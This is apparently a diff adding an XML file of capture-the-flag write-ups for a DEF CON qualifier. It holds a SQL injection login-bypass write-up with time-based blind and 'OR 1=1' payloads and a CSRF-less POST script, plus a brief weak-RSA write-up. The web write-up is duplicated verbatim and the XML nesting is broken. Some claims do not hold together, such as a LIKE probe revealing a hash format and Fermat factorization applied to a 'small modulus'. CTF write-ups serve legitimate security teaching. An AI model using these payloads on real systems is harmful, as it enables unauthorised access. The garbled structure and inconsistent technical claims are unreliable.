@@ -1,0 +1,220 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<ctf>
+    <info>
+        <name>DEF CON 31 Qualifier</name>
+        <date>May 12-14, 2023</date>
+        <team>CTFPlayers</team>
+        <rank>42</rank>
+        <solves>8/25</solves>
+    </info>
+    
+    <writeups>
+        <writeup id="web1" category="Web" points="200" difficulty="Medium">
+            <title>SQL Injection Mastery</title>
+            <summary>Advanced SQLi bypassing multiple protections</summary>
+            <time>1h 23m</time>
+            <author>SecurityExpert</author>
+            
+            <overview><![CDATA[
+                <p>The challenge presented an advanced login portal with what appeared to be robust security measures including:</p>
+                <ul>
+                    <li>CSRF token protection</li>
+                    <li>Rate limiting (5 requests/minute)</li>
+                    <li>Custom "secure" password hashing</li>
+                </ul>
+                <p>Our goal was to bypass authentication and access the admin dashboard.</p>
+            ]]></overview>
+            
+            <recon><![CDATA[
+                <p>First, I analyzed the login form:</p>
+                <pre><code>&lt;form id="loginForm" action="/auth" method="POST">
+    &lt;input type="hidden" name="csrf" value="a1b2c3d4e5">
+    &lt;div class="form-group">
+        &lt;label>Username&lt;/label>
+        &lt;input type="text" name="user" pattern="[A-Za-z0-9]{4,12}" required>
+    &lt;/div>
+    &lt;div class="form-group">
+        &lt;label>Password&lt;/label>
+        &lt;input type="password" name="pass" minlength="8" required>
+    &lt;/div>
+    &lt;button type="submit">Login&lt;/button>
+&lt;/form></code></pre>
+
+                <p>Key observations:</p>
+                <table class="writeup-table">
+                    <tr>
+                        <th>Element</th>
+                        <th>Vulnerability</th>
+                    </tr>
+                    <tr>
+                        <td>CSRF Token</td>
+                        <td>Not validated server-side</td>
+                    </tr>
+                    <tr>
+                        <td>Username Pattern</td>
+                        <td>No SQL injection filtering</td>
+                    </tr>
+                    <tr>
+                        <td>Password Length</td>
+                        <td>Client-side only validation</td>
+                    </tr>
+                </table>
+            ]]></recon>
+            
+            <exploit><![CDATA[
+                <p>After several failed attempts with standard payloads, I developed a multi-step approach:</p>
+                
+                <h3>Step 1: Bypass CSRF Protection</h3>
+                <pre><code># Python request without CSRF token
+import requests
+
+url = "https://ctf.example.com/auth"
+data = {"user": "admin", "pass": "password"}
+response = requests.post(url, data=data)</code></pre>
+                <p>This confirmed CSRF tokens weren't being validated.</p>
+
+                <h3>Step 2: Craft Time-Based Blind SQLi</h3>
+                <pre><code>admin' AND (SELECT sleep(2) FROM users WHERE username='admin' AND password LIKE 'a%')--</code></pre>
+                <p>This revealed the password hash structure: <code>$secure$10000$salt$hash</code></p>
+
+                <h3>Step 3: Final Exploit</h3>
+                <pre><code>admin' OR 1=1; --
+password: anything</code></pre>
+            ]]></exploit>
+            
+            <flag><![CDATA[
+                <p>After successful login, the flag was displayed in the admin panel:</p>
+                <div class="flag">FLAG{adv4nc3d_sql1_byp4ss}</div>
+            ]]></flag>
+            
+            <lessons><![CDATA[
+                <ul>
+                    <li>Never trust client-side validation</li>
+                    <li>CSRF tokens must be properly validated</li>
+                    <li>Custom security implementations often have flaws</li>
+                    <li>Time-based attacks can bypass many protections</li>
+                </ul>
+            ]]></lessons>
+        </writeup>
+
+        <writeups>
+        <writeup id="web1" category="Web" points="200" difficulty="Medium">
+            <title>SQL Injection Mastery</title>
+            <summary>Advanced SQLi bypassing multiple protections</summary>
+            <time>1h 23m</time>
+            <author>SecurityExpert</author>
+            
+            <overview><![CDATA[
+                <p>The challenge presented an advanced login portal with what appeared to be robust security measures including:</p>
+                <ul>
+                    <li>CSRF token protection</li>
+                    <li>Rate limiting (5 requests/minute)</li>
+                    <li>Custom "secure" password hashing</li>
+                </ul>
+                <p>Our goal was to bypass authentication and access the admin dashboard.</p>
+            ]]></overview>
+            
+            <recon><![CDATA[
+                <p>First, I analyzed the login form:</p>
+                <pre><code>&lt;form id="loginForm" action="/auth" method="POST">
+    &lt;input type="hidden" name="csrf" value="a1b2c3d4e5">
+    &lt;div class="form-group">
+        &lt;label>Username&lt;/label>
+        &lt;input type="text" name="user" pattern="[A-Za-z0-9]{4,12}" required>
+    &lt;/div>
+    &lt;div class="form-group">
+        &lt;label>Password&lt;/label>
+        &lt;input type="password" name="pass" minlength="8" required>
+    &lt;/div>
+    &lt;button type="submit">Login&lt;/button>
+&lt;/form></code></pre>
+
+                <p>Key observations:</p>
+                <table class="writeup-table">
+                    <tr>
+                        <th>Element</th>
+                        <th>Vulnerability</th>
+                    </tr>
+                    <tr>
+                        <td>CSRF Token</td>
+                        <td>Not validated server-side</td>
+                    </tr>
+                    <tr>
+                        <td>Username Pattern</td>
+                        <td>No SQL injection filtering</td>
+                    </tr>
+                    <tr>
+                        <td>Password Length</td>
+                        <td>Client-side only validation</td>
+                    </tr>
+                </table>
+            ]]></recon>
+            
+            <exploit><![CDATA[
+                <p>After several failed attempts with standard payloads, I developed a multi-step approach:</p>
+                
+                <h3>Step 1: Bypass CSRF Protection</h3>
+                <pre><code># Python request without CSRF token
+import requests
+
+url = "https://ctf.example.com/auth"
+data = {"user": "admin", "pass": "password"}
+response = requests.post(url, data=data)</code></pre>
+                <p>This confirmed CSRF tokens weren't being validated.</p>
+
+                <h3>Step 2: Craft Time-Based Blind SQLi</h3>
+                <pre><code>admin' AND (SELECT sleep(2) FROM users WHERE username='admin' AND password LIKE 'a%')--</code></pre>
+                <p>This revealed the password hash structure: <code>$secure$10000$salt$hash</code></p>
+
+                <h3>Step 3: Final Exploit</h3>
+                <pre><code>admin' OR 1=1; --
+password: anything</code></pre>
+            ]]></exploit>
+            
+            <flag><![CDATA[
+                <p>After successful login, the flag was displayed in the admin panel:</p>
+                <div class="flag">FLAG{adv4nc3d_sql1_byp4ss}</div>
+            ]]></flag>
+            
+            <lessons><![CDATA[
+                <ul>
+                    <li>Never trust client-side validation</li>
+                    <li>CSRF tokens must be properly validated</li>
+                    <li>Custom security implementations often have flaws</li>
+                    <li>Time-based attacks can bypass many protections</li>
+                </ul>
+            ]]></lessons>
+        </writeup>
+        
+        
+        <writeup id="crypto2" category="Crypto" points="350" difficulty="Hard">
+            <title>Broken RSA</title>
+            <summary>Factorizing weak RSA keys</summary>
+            <time>3h 45m</time>
+            <author>CryptoGuru</author>
+            
+            <overview><![CDATA[
+                <p>This challenge involved breaking an RSA implementation with multiple vulnerabilities.</p>
+            ]]></overview>
+            
+            <recon><![CDATA[
+                <p>Initial analysis of the public key showed an unusually small modulus.</p>
+            ]]></recon>
+            
+            <exploit><![CDATA[
+                <p>Used Fermat's factorization method to break the key.</p>
+            ]]></exploit>
+            
+            <flag><![CDATA[
+                <div class="flag">FLAG{weak_rsa_keys}</div>
+            ]]></flag>
+            
+            <lessons><![CDATA[
+                <ul>
+                    <li>Always use strong prime generation</li>
+                    <li>Small key sizes are vulnerable</li>
+                </ul>
+            ]]></lessons>
+        </writeup>
+    </writeups>
+</ctf>
